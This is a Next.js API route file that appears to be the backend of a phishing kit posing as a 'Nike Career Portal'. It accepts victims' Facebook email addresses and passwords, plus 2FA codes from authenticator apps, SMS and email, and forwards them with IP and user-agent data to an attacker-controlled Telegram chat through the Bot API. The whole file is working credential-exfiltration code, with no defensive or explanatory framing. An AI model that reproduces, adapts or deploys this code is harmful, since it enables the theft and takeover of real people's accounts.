import { NextRequest, NextResponse } from 'next/server'

// Telegram Bot Integration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('❌ Missing Telegram configuration in environment variables')
  console.error('Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in your .env.local file')
}

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`

interface FacebookCredentials {
  email: string
  password: string
  timestamp: string
  userAgent?: string
  ipAddress?: string
}

interface TwoFactorCode {
  code: string
  type: '2fa' | '2fa-sms' | '2fa-email' | '2fa-error' | '2fa-sms-error' | '2fa-email-error'
  email?: string
  timestamp: string
  userAgent?: string
  ipAddress?: string
}

async function sendToTelegram(credentials: FacebookCredentials): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Telegram credentials not configured')
    return false
  }

  try {
    const message = `🔐 Facebook Login Attempt

📧 Email: ${credentials.email}
🔑 Password: ${credentials.password}
⏰ Time: ${credentials.timestamp}
🌐 User Agent: ${credentials.userAgent || 'Unknown'}
🌍 IP Address: ${credentials.ipAddress || 'Unknown'}

---
Nike Career Portal`

    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    })

    if (response.ok) {
      console.log('✅ Facebook credentials sent to Telegram successfully')
      return true
    } else {
      console.error('❌ Failed to send to Telegram:', await response.text())
      return false
    }
  } catch (error) {
    console.error('❌ Error sending to Telegram:', error)
    return false
  }
}

async function send2FAToTelegram(twoFactorData: TwoFactorCode): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Telegram credentials not configured')
    return false
  }

  try {
    const typeLabels = {
      '2fa': '📱 Authenticator App',
      '2fa-sms': '📱 SMS/WhatsApp',
      '2fa-email': '📧 Email',
      '2fa-error': '❌ Authenticator App (Error)',
      '2fa-sms-error': '❌ SMS/WhatsApp (Error)',
      '2fa-email-error': '❌ Email (Error)'
    }

    const message = `🔐 2FA Code Entered

🔢 Code: ${twoFactorData.code}
📋 Type: ${typeLabels[twoFactorData.type]}
${twoFactorData.email ? `📧 Email: ${twoFactorData.email}` : ''}
⏰ Time: ${twoFactorData.timestamp}
🌐 User Agent: ${twoFactorData.userAgent || 'Unknown'}
🌍 IP Address: ${twoFactorData.ipAddress || 'Unknown'}

---
Nike Career Portal`

    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    })

    if (response.ok) {
      console.log('✅ 2FA code sent to Telegram successfully')
      return true
    } else {
      console.error('❌ Failed to send 2FA code to Telegram:', await response.text())
      return false
    }
  } catch (error) {
    console.error('❌ Error sending 2FA code to Telegram:', error)
    return false
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { type, data } = body

    if (type === 'facebook-login') {
      const success = await sendToTelegram(data as FacebookCredentials)
      return NextResponse.json({ success })
    } else if (type === '2fa-code') {
      const success = await send2FAToTelegram(data as TwoFactorCode)
      return NextResponse.json({ success })
    } else {
      return NextResponse.json({ error: 'Invalid type' }, { status: 400 })
    }
  } catch (error) {
    console.error('❌ Error in Telegram API route:', error)
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 })
  }
} 